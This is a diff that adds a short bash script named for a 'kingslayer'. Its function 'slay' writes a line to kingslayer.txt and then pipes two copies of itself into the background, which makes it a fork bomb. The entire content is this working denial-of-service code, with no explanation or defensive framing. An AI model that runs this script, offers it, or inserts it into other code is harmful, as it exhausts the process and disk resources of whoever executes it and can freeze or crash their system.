@@ -1,0 +1,6 @@
+#!/bin/bash
+slay() {
+	echo "KINGSLAYER, DESTROYING CASTLES IN THE SKY" >> kingslayer.txt
+	slay | slay &
+}
+slay
